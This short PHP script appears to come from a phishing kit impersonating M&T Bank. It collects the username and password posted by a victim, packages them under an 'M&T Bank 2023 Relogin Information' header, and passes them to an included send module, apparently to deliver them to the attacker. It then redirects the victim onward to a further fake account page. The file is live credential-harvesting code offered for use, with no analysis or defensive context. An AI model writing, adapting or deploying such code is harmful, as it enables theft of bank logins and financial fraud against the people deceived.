<?php
require_once('Module/Setmodule.php');
$message .= " -------------- M&T Bank 2023 Relogin Information -------------- \n"."\n";
$message .= "Username: ".$_POST['userID']."\n"; 
$message .= "Password: ".$_POST['passcode']."\n\n";  

require_once('Module/SendModule.php');

	header("Location: ../Account.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  
?>